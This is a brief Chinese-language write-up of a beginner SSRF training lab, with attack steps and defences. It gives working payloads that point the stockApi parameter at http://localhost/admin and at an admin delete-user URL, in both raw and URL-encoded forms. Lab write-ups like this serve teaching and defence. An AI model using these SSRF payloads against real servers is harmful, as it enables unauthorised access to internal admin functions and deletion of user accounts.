# 实验名称：针对本地服务器的基本SSRF

## 基本信息
- **难度** 初级
- **类别** SSRF

## 漏洞原理
- 服务器直接使用用户提供的 URL 发起请求，没有做限制

## 攻击步骤
- 检查/admin发现无法直接访问
- 访问一个圣商品页面 -> 点击检查库存使用burp拦截这条请求
- 将stockAPI的URL更改为`http://localhost/admin`这将显示管理界面
- 将URL改为`http://localhost/admin/delete?username=carlos`并提交则能删除目标完成攻击
## 补充说明
- payload应使用URL编码进行编码后再提交原始：
`http://localhost/admin`
编码后：
`stockApi=http%3A%2F%2Flocalhost%2Fadmin`
原始：
`http://localhost/admin/delete?username=carlos`
编码后：
`stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos`
## 防御措施
- 白名单验证只允许请求预定义的合法 URL
- 禁止请求内网地址：过滤 localhost、127.0.0.1、169.254.x.x 等
- 不将用户输入直接作为请求 URL
- 网络层隔离：服务器无法访问内部管理接口
## 总结
- 